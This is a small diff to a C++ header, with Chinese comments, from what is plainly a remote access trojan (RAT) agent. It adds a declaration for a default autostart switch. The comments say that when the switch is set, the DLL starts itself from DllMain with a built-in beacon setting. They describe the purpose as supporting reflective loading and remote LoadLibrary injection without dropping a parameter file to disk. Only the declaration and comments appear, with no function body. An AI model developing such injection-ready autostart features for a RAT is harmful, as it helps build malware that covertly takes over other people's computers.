@@ -53,6 +53,12 @@ std::string agent_autostart_path();                  // 首选路径（供注入
 // 轻量探测（只用 Win32 + 栈缓冲，可在 DllMain 的 loader lock 下安全调用）
 bool agent_autostart_trigger_present();
 bool agent_autostart_requested(std::string& args);   // 触发器存在？存在则回填参数串
+// 显式开关（默认关闭，仅 DLL 形态使用）：环境变量 RAT_AUTOSTART_DEFAULT=1 时，
+// 即使**没有**触发器文件，也在 DllMain 后按内置默认配置自启（beacon 127.0.0.1:8080 -s 5）。
+// 用途：反射加载 / 远程 LoadLibrary 这类"没有参数通道"的场景，不必先落盘一个参数文件。
+// 语义边界：有触发器文件时仍以文件参数为准；开关不开时行为与以前完全一致
+// （rundll32 Stop / LoadLibrary 宿主不被抢跑）。
+bool agent_autostart_default_enabled();
 
 // 启动：内部起工作线程后立即返回；已在运行返回 false
 bool agent_start(const AgentRunArgs& args, std::string& err);
